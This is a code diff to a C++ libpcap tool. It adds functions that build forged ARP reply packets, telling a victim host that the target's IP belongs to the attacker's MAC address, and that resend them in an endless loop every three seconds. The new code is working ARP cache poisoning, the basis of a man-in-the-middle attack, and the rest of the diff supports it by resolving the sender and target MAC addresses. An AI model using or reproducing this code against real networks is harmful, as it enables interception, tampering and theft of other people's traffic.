@@ -17,6 +17,8 @@ int findARPReply(pcap_t* pcd, Mac* retnMAC, uint32_t* find_IP, uint32_t* my_IP);
 void getSenderMAC(pcap_t *pcd,Param* param,int sessionNum);
 void getTargetMAC(pcap_t *pcd,Param* param,int sessionNum);
 void sendARPReguest(Param param,uint32_t*findIP,int print,pcap_t *pcd);
+void sendInfectionPacket(pcap_t* pcd,Param param);
+void callSendInfectionPacket(pcap_t* pcd, Param *param, int sessionNum);
 
 struct ARPPacket{
     struct ether_header eh;
@@ -46,25 +48,17 @@ int main(int argc, char *argv[])
     /*init pcd*/
 
 
-    for (int i = 0; i < protoParam.sessionNum; ++i) {
-        param[i].printInfo();
-    }
-
+    cout<<"Processing..."<<endl;
     getSenderMAC(pcd,param,protoParam.sessionNum);
     getTargetMAC(pcd,param,protoParam.sessionNum);
 
-
     for (int i = 0; i < protoParam.sessionNum; ++i) {
-        cout<<"Sesstion "<<i+1<<" Info"<<endl;
+        cout<<"Session "<<i+1<<" Info"<<endl;
         printLine();
-        cout<<"Attacker MAC : ";
-        printByMAC(param[i].my_Mac.retnMac(),ETHER_ADDR_LEN);
-        cout<<"Sender MAC : ";
-        printByMAC(param[i].sender_Mac.retnMac(),ETHER_ADDR_LEN);
-        cout<<"Target MAC : ";
-        printByMAC(param[i].target_Mac.retnMac(),ETHER_ADDR_LEN);
-
+        param[i].printInfo();
     }
+
+    callSendInfectionPacket(pcd,param,protoParam.sessionNum);
 
 }
 
@@ -136,8 +130,8 @@ void getSenderMAC(pcap_t *pcd,Param* param,int sessionNum)
 
     for (int i = 0; i < sessionNum; ++i) {
         thread t1(&findARPReply,pcd,&param[i].sender_Mac,param[i].sender_Ip.retnIP(),param[i].my_Ip.retnIP());
-        sleep(3);
-        thread t2(&sendARPReguest,param[i],param[i].sender_Ip.retnIP(),1,pcd);
+        sleep(1);
+        thread t2(&sendARPReguest,param[i],param[i].sender_Ip.retnIP(),0,pcd);
         t1.join();
         t2.join();
     }
@@ -148,8 +142,8 @@ void getTargetMAC(pcap_t *pcd,Param* param,int sessionNum)
 
     for (int i = 0; i < sessionNum; ++i) {
         thread t1(&findARPReply,pcd,&param[i].target_Mac,param[i].target_Ip.retnIP(),param[i].my_Ip.retnIP());
-        sleep(3);
-        thread t2(&sendARPReguest,param[i],param[i].target_Ip.retnIP(),1,pcd);
+        sleep(1);
+        thread t2(&sendARPReguest,param[i],param[i].target_Ip.retnIP(),0,pcd);
         t1.join();
         t2.join();
     }
@@ -196,4 +190,42 @@ void sendARPReguest(Param param, uint32_t *findIP, int print, pcap_t *pcd)
 
      pcap_sendpacket(pcd,(u_int8_t*)&ARPRequest,sizeof(ARPPacket));
 
+}
+
+void sendInfectionPacket(pcap_t* pcd,Param param)
+{
+    struct ARPPacket ARPInfection;
+
+    memcpy(ARPInfection.eh.ether_dhost,param.sender_Mac.retnMac(),ETHER_ADDR_LEN); //destnation mac is sender mac
+    memcpy(ARPInfection.eh.ether_shost,param.my_Mac.retnMac(),ETHER_ADDR_LEN); //source mac is my mac
+    ARPInfection.eh.ether_type=htons(ETHERTYPE_ARP); //define next protocol
+
+
+    ARPInfection.arp.ea_hdr.ar_hrd=ntohs(1);             //set Hardware Type Ethernet
+    ARPInfection.arp.ea_hdr.ar_pro=ntohs(ETHERTYPE_IP);  //set protocol type IP
+    ARPInfection.arp.ea_hdr.ar_hln=6;             //set Hardware Size 6 -> MAC address size
+    ARPInfection.arp.ea_hdr.ar_pln=4;             //set Protocol length 4 -> 4 IP address size
+    ARPInfection.arp.ea_hdr.ar_op=ntohs(2);              //set opcode 2(reply)
+
+
+    memcpy(ARPInfection.arp.arp_sha,param.my_Mac.retnMac(),ETHER_ADDR_LEN);  //set Source Address to My MAC
+    memcpy(ARPInfection.arp.arp_spa,param.target_Ip.retnIP(),IP_ADDR_LEN);       //set Source Protocol Address to Target IP
+    memcpy(ARPInfection.arp.arp_tha,param.sender_Mac.retnMac(),ETHER_ADDR_LEN);              //set Target Hardware Address to Sender MAC
+    memcpy(ARPInfection.arp.arp_tpa,param.sender_Ip.retnIP(),IP_ADDR_LEN);    //set Target Protocol Address to Sender IP
+
+
+    pcap_sendpacket(pcd,(uint8_t*)&ARPInfection,sizeof(ARPInfection));
+
+}
+
+void callSendInfectionPacket(pcap_t *pcd, Param* param, int sessionNum)
+{
+    while(true)
+    {
+        for (int i = 0; i < sessionNum; ++i) {
+            sendInfectionPacket(pcd,param[i]);
+
+        }
+        sleep(3);
+    }
 }
